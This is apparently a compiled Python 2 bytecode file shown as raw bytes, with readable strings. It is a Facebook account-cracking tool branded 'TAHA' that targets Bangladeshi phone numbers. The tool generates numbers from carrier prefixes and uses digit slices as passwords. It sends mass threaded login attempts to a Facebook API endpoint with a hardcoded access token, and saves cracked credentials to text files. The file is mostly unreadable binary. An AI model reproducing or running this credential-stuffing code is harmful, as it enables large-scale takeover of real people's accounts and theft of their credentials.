
�
g�bc�����������@���s���d��d�l��Z��d��d�l�Z�d��d�l�Z�d��d�l�Z�d��d�l�Z�d��d�l�Z�d��d�l�Z�d��d�l�Z�d��d�l�Z�d��d�l	�Z	�d��d�l
�Z
�d��d�l�Z�e��j�d���d����Z
�d�Z�d�Z�d�Z�d�Z�d�Z�d	�Z�d
�Z�d�Z�d�Z�d�Z�e��j�d
���e
�e�d���xJ�e�d���D]<�Z�e�j�d�d���Z�e�d�d���e�_�e�GHe�j�j����q
Wy�d��d�l�Z�Wn�e�k
�rze��j�d���n�Xy�d��d�l �Z �Wn8�e�k
�r�e��j�d���e�j!�d���e��j�d���n�Xd��d�l"�m#�Z#�d��d�l$�m%�Z%�d��d�l �m&�Z&�e��j�d
���e'�e���e�j(�d���e �j&����Z)�e)�j*�e+���e)�j,�e �j-�j.����d�d��d(�g�e)�_/�d����Z0�d ����Z
�d!����Z1�d"����Z2�d#�e�Z3�d$�Z4�g��Z5�g��a6�g��a7�g��Z8�d%����Z9�d&����Z:�e;�d'�k�r�e9����n��d�S()���i����Ns���rm -rf .txtc���������C���sC���x<�|��d�D]0�}�t��j�j�|���t��j�j����t�j�d���q�Wd��S(���Ns���
g{�G�z�?(���t���syst���stdoutt���writet���flusht���timet���sleep(���t���zt���e(����(����s���/sdcard/old.pyt���psb
���s����
s���[0ms���[0;30ms���[0;31ms���[0;32ms���[0;33ms���[0;34ms���[0;35ms���[0;36ms���[0;37mt���clears����          >>PLEASE WAIT<<
             FREE TOOL
          Only Old Id Clone
        AUTHOR    : TAHA CH
        Facebook  : TAHA CH
        Whatsapp  : +923075948865
           Process Starting 
             Wait 1 MnitiP���iG��i���s���.txtt���as���pip2 install requestss���pip2 install mechanizei���s	���python2 C(���t
���ThreadPool(���t���ConnectionError(���t���Browsert���utf8t���max_times
���user-agents��Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]c�����������C���s���Ht��j�j����d��S(���N(���t���osR����t���exit(����(����(����s���/sdcard/old.pyt���exb@���s����c���������C���sC���x<�|��d�D]0�}�t��j�j�|���t��j�j����t�j�d���q�Wd��S(���Ns���
g���Q��?(���R����R���R���R���R���R���(���R���R���(����(����s���/sdcard/old.pyR���E���s����
c�����������C���s���t��j�d���d��S(���Ni���(���R���R���(����(����(����s���/sdcard/old.pyt���tL���s����c�����������C���s���t��j�d���d��S(���NR	���(���R���t���system(����(����(����s���/sdcard/old.pyt���cbP���s����s@��[1;92m



████████╗░█████╗░██╗░░██╗░█████╗░
╚══██╔══╝██╔══██╗██║░░██║██╔══██╗
░░░██║░░░███████║███████║███████║
░░░██║░░░██╔══██║██╔══██║██╔══██║
░░░██║░░░██║░░██║██║░░██║██║░░██║
░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝
                                                   
                                                                                                 
i����c�����������C���sa���t��j�d���t�GHd�d�GHd�GHd�GHd�GHd�GHd�GHd	�GHd
�GHd�GHd�GHd
�GHd�d�GHt����d��S(���NR	���i2���t���-s���[1;92ms���            [RANDOM ID COINING]t����s*���[ONLY BANGLADESHI ACCOUNTS ARE AVAILABLE]
s���[1]  [1;96mGP  [Problem]s���[2]  [1;92mRobis���[3]  [1;96mAirtels���[4]  [1;92mBanglalinks���[5]  [1;93mTeletalks���[0]  [1;95mExit            s���[1;92m-(���R���R���t���logot���action(����(����(����s���/sdcard/old.pyt���mainh���s����
		c�������������s���t��d���}��|��d�k�r#�Ht����n�|��d�k�r��t�j�d���t�GHd�d�GHd�GHd�GHd�GHyO�t��d������d���d	�}�x0�t�|�d
���j����D]�}�t�j�|�j	������q��WWq�t
�k
�r��d�GHt��d���|����q�Xn�|��d
�k�r�t�j�d���t�GHd�d�GHd�GHd�GHd�GHyO�t��d������d���d	�}�x0�t�|�d
���j����D]�}�t�j�|�j	������q<WWq�t
�k
�r�d�GHt��d���|����q�Xn4|��d�k�r9t�j�d���t�GHd�d�GHd�GHd�GHd�GHyO�t��d������d���d	�}�x0�t�|�d
���j����D]�}�t�j�|�j	������q�WWq�t
�k
�r5d�GHt��d���|����q�Xn�|��d�k�r�t�j�d���t�GHd�d�GHd�GHd�GHd�GHyO�t��d������d���d	�}�x0�t�|�d
���j����D]�}�t�j�|�j	������q�WWq�t
�k
�r�d�GHt��d���|����q�Xn��|��d�k�r�t�j�d���t�GHd�d�GHd�GHd�GHd�GHyO�t��d������d���d	�}�x0�t�|�d
���j����D]�}�t�j�|�j	������qRWWq�t
�k
�r�d�GHt��d���|����q�Xn�|��d�k�r�t����n�Ht����t�t
�t�����}�t�d�|���t�j�d���t�d���t�j�d���t�d���t�j�d���t�d�d���t�j�d���Hd�d�H�����f�d����}�t�d���}�|�j�|�t���Hd�d�HHd�t�t
�t�����d�t�t
�t�����d�GHt��d ���t�j�d!���d��S("���Ns���
 [1;91m ===>> R���t���1R	���i2���R���s/���170,171, 172, 173, 174, 175, 176, 177, 178, 179s��� Choose Code  : s���.txtt���rs���[!] File Not Founds	���
[ Back ]t���2s/���180,181, 182, 183, 184, 185, 186, 187, 188, 189s���+880t���3s/���160,161, 162, 163, 164, 165, 166, 167, 168, 169t���4s/���190,191, 192, 193, 194, 195, 196, 197, 198, 199t���5s/���150,151, 152, 153, 154, 155, 156, 157, 158, 159t���0s���[✓] Total Numbers: g�������?s)���[✓] Please wait, process is running ...s+���[!] To Stop Process Press CTRL Then Press zc���	���������s���|��}�y�t��j�d���Wn�t�k
�r*�n�XyY�����|�}�|�d�d�!}�|�}�t�j�d������|�d�|�d���}�t�j�|���}�d�|�k�rd������|�d	�|�d
�d
�GHt�d�d���}�|�j������|�d
�|�d���|�j����t	�j
����|�|���n�d�|�d�k�r�d������|�d	�|�d�GHt�d�d���}�|�j������|�d
�|�d���|�j����t�j
����|�|���n��Wn�n�Xd��S(���Nt���savei���i���s����https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=s���&locale=en_US&password=sH���&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efmt���access_tokens ���[1;92m   [TAHA-OK]    [1;92m s���  |  R���s���save/successfull.txtR
���t���|s���
s���www.facebook.comt	���error_msgs ���[1;91m   [TAHA]       [1;92m s���[1;93m[0m s���save/checkpoint.txt(���R���t���mkdirt���OSErrort���brt���opent���jsont���loadR���t���closet���okst���appendt���cpb(	���t���argt���usert���resultt���digi6t���pass1t���datat���qt���okbt���cps(���t���ct���k(����s���/sdcard/old.pyR�������s2����

'!!
!
i���s���[✓] Total OK/CP : t���/s2���[✓] CP File Has Been Saved : save/checkpoint.txts���
[Press Enter To Go Back]s���python2 old.py(���t	���raw_inputR���R���R���R���R)���t	���readlinest���idR.���t���stript���IOErrorR���t���strt���lenR���R���R���R���t���mapR-���R/���(���t���bcht���idlistt���lineR���t���xxxt���p(����(���R9���R:���s���/sdcard/old.pyR���z���s�����

	


	


	


	


	








(
t���__main__(���s
���user-agents��Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;](<���R���R����R���t���datetimet���randomt���hashlibt���ret	���threadingR*���t���urllibt	���cookielibt���getpassR���R���t	���color_offt���blackt���redt���greent���yellowt���bluet���purplet���cyant���whitet���ranget���nt���randintt���nmbrR)���R���R���t���requestst���ImportErrort	���mechanizeR���t���multiprocessing.poolR���t���requests.exceptionsR���R
���t���reloadt���setdefaultencodingR(���t���set_handle_robotst���Falset���set_handle_refresht���_httpt���HTTPRefreshProcessort
���addheadersR���R���R���R���t���backt
���successfulR/���R-���R>���R���R���t���__name__(����(����(����s���/sdcard/old.pyt���<module>
���sj����
	








				
		�


	rimon
